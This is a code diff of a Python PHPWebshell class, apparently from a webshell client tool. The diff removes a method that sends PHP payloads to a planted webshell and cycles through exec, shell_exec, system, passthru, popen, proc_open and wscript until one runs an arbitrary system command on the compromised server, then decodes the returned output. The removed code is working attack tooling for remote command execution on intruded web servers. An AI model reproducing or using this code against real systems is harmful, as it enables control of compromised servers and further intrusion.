@@ -11,32 +11,6 @@ class PHPWebshell(Webshell):
 
     def __init__(self):
         super().__init__()
-        self.options.add_option('exec_type', 
-            f"Tell webshell to use which function to exec a system command.\nSpecify `auto` will try to use the first available function.\nYou can see {os.path.join(os.path.dirname(__file__), 'php','exec')+os.sep} got more.", False,
-            check=r'exec|shell_exec|system|passthru|popen|proc_open|wscript|auto', default='auto')
-
-    def exec(self, cmdline: str)->bytes:
-        '''在服务器上执行命令并获取结果
-        '''
-        fl = [self.options.exec_type]
-        if self.options.exec_type in ('auto', None, ''):
-            fl = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'wscript']
-        for f in fl:
-            try:
-                p = PHPPayload(f'php/exec/{f}.php', cmd=cmdline, pwd=self.session.state['pwd'])
-                tmp = self.eval(p)
-                if not tmp.is_success():
-                    return None
-                r = json.loads(tmp.data)
-                if r['code'] == 0:
-                    continue
-                self.options.set_option('exec_type', f)
-                result = base64.b64decode(r['result'].encode())
-            except Exception as e:
-                logger.error('Occur an error!')
-                result = f'Recv: {tmp}'.encode()
-            return result
-        return 'No way to exec command!Maybe all functions is disabled.'.encode()
 
     def _to_php_errcode(self, code):
         '''将错误代码转为可读的错误标识
